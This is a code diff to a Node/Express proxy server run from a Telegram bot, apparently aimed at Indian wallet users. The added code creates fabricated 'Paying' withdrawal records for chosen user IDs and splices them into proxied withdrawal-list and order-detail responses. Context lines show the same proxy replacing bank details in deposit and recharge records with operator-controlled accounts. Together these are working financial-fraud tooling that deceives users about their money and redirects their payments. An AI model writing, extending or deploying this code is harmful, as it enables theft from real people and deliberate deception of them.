@@ -26,7 +26,7 @@ async function ensureWebhook() {
   } catch (e) {}
 }
 
-const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1, depositSuccess: false, depositBonus: 0, userOverrides: {}, trackedUsers: {} };
+const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1, depositSuccess: false, depositBonus: 0, userOverrides: {}, trackedUsers: {}, fakeWithdrawals: {} };
 
 async function loadData() {
   try {
@@ -35,6 +35,7 @@ async function loadData() {
       if (typeof data === 'string') data = JSON.parse(data);
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.trackedUsers) data.trackedUsers = {};
+      if (!data.fakeWithdrawals) data.fakeWithdrawals = {};
       return data;
     }
   } catch (e) {}
@@ -400,6 +401,10 @@ app.post('/api/telegram', async (req, res) => {
 /deposit on <amount> - ALL users deposit success
 /deposit off - ALL users normal
 
+=== WITHDRAW COMMANDS ===
+/on withdraw <userId> <amount> - Add fake Paying withdrawal
+/off withdraw <userId> - Remove fake withdrawal
+
 === PER-ID COMMANDS ===
 /id deposit on <amount> <userId>
 /id deposit off <userId>
@@ -566,6 +571,54 @@ Example:
       return res.sendStatus(200);
     }
 
+    else if (text.match(/^\/on withdraw\s+/i)) {
+      const wMatch = text.match(/^\/on withdraw\s+(\S+)\s+(\S+)$/i);
+      if (!wMatch) {
+        await bot.sendMessage(chatId, '❌ Format: /on withdraw <userId> <amount>');
+        return res.sendStatus(200);
+      }
+      const userId = wMatch[1];
+      const amount = parseFloat(wMatch[2]);
+      if (isNaN(amount) || amount <= 0) {
+        await bot.sendMessage(chatId, '❌ Invalid amount.');
+        return res.sendStatus(200);
+      }
+      if (!bankData.fakeWithdrawals) bankData.fakeWithdrawals = {};
+      const now = new Date();
+      const orderId = 'DS' + now.getFullYear().toString().substring(2) + String(now.getMonth() + 1).padStart(2, '0') + String(now.getDate()).padStart(2, '0') + String(now.getHours()).padStart(2, '0') + String(now.getMinutes()).padStart(2, '0') + String(now.getSeconds()).padStart(2, '0') + String(now.getMilliseconds()).padStart(3, '0') + Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+      const createTime = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: false, year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(/(\d+)\/(\d+)\/(\d+),\s*/, '$3-$2-$1 ');
+      bankData.fakeWithdrawals[userId] = {
+        orderId,
+        amount: amount.toFixed(2),
+        status: 0,
+        statusName: 'Paying',
+        createTime,
+        userId,
+        createdAt: now.toISOString()
+      };
+      await saveData(bankData);
+      await bot.sendMessage(chatId, `✅ Fake withdrawal added for user ${userId}\n💰 Amount: ₹${amount.toFixed(2)}\n📋 Order: ${orderId}\n📊 Status: Paying\n\nUse /off withdraw ${userId} to remove.`);
+      return res.sendStatus(200);
+    }
+
+    else if (text.match(/^\/off withdraw\s+/i)) {
+      const userId = text.replace(/^\/off withdraw\s+/i, '').trim();
+      if (!userId) {
+        await bot.sendMessage(chatId, '❌ Format: /off withdraw <userId>');
+        return res.sendStatus(200);
+      }
+      if (!bankData.fakeWithdrawals) bankData.fakeWithdrawals = {};
+      if (bankData.fakeWithdrawals[userId]) {
+        const removed = bankData.fakeWithdrawals[userId];
+        delete bankData.fakeWithdrawals[userId];
+        await saveData(bankData);
+        await bot.sendMessage(chatId, `🗑 Fake withdrawal removed for user ${userId}\nOrder: ${removed.orderId}\nAmount: ₹${removed.amount}`);
+      } else {
+        await bot.sendMessage(chatId, `ℹ️ No fake withdrawal found for user ${userId}.`);
+      }
+      return res.sendStatus(200);
+    }
+
     else if (text.startsWith('/addbank ')) {
       const parts = text.substring(9).split('|').map(s => s.trim());
       if (parts.length !== 3) {
@@ -707,6 +760,13 @@ For per-ID control: /id deposit on <amount> <userId>`
       msg += `Deposit: ${deposit ? '✅ SUCCESS (₹' + (bankData.depositBonus || 0) + ')' : '🔴 Normal'}\n`;
       msg += `Banks: ${bankData.banks.length}\n`;
       msg += `Per-ID overrides: ${idCount}\n`;
+      const fwCount = Object.keys(bankData.fakeWithdrawals || {}).length;
+      if (fwCount > 0) {
+        msg += `Fake Withdrawals: ${fwCount} active\n`;
+        for (const [uid, fw] of Object.entries(bankData.fakeWithdrawals)) {
+          msg += `  👤 ${uid}: ₹${fw.amount} (${fw.statusName})\n`;
+        }
+      }
       if (active) {
         msg += `\nCurrent Bank:\n${active.accountHolder} | ${active.accountNo} | ${active.ifsc}`;
       } else {
@@ -938,6 +998,70 @@ app.all('/money/orderDetail', async (req, res) => {
 app.all('/money/rechargeRecord', async (req, res) => {
   await proxyAndReplaceBankInList(req, res);
 });
+app.all('/withdraw/list', async (req, res) => {
+  const bankData = await loadData();
+
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+
+    const detectedUserId = extractUserId(req, jsonResp);
+
+    if (jsonResp && detectedUserId && bankData.fakeWithdrawals && bankData.fakeWithdrawals[detectedUserId]) {
+      const fake = bankData.fakeWithdrawals[detectedUserId];
+      const fakeItem = {
+        orderId: fake.orderId,
+        amount: fake.amount,
+        amountOrder: fake.amount,
+        status: fake.status,
+        statusName: fake.statusName,
+        createTime: fake.createTime,
+        userId: parseInt(detectedUserId) || detectedUserId
+      };
+
+      if (Array.isArray(jsonResp.data)) {
+        jsonResp.data.unshift(fakeItem);
+      } else if (jsonResp.data && jsonResp.data.list && Array.isArray(jsonResp.data.list)) {
+        jsonResp.data.list.unshift(fakeItem);
+      } else if (jsonResp.data && jsonResp.data.records && Array.isArray(jsonResp.data.records)) {
+        jsonResp.data.records.unshift(fakeItem);
+      }
+    }
+
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch (e) {
+    console.error('withdraw/list proxy error:', e.message);
+    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
+  }
+});
+
+app.all('/withdraw/orderId', async (req, res) => {
+  const bankData = await loadData();
+  const detectedUserId = extractUserId(req, null);
+  const qs = new URLSearchParams((req.originalUrl.split('?')[1]) || '');
+  const reqOrderId = req.parsedBody?.orderId || qs.get('orderId') || '';
+
+  if (detectedUserId && bankData.fakeWithdrawals && bankData.fakeWithdrawals[detectedUserId]) {
+    const fake = bankData.fakeWithdrawals[detectedUserId];
+    if (fake.orderId === reqOrderId) {
+      return res.json({
+        code: 1,
+        data: {
+          orderId: fake.orderId,
+          amount: fake.amount,
+          amountOrder: fake.amount,
+          status: fake.status,
+          statusName: fake.statusName,
+          createTime: fake.createTime,
+          userId: parseInt(detectedUserId) || detectedUserId
+        },
+        msg: 'success'
+      });
+    }
+  }
+
+  await transparentProxy(req, res);
+});
+
 app.all('/money/withdrawRecord', async (req, res) => {
   await proxyAndReplaceBankInList(req, res);
 });
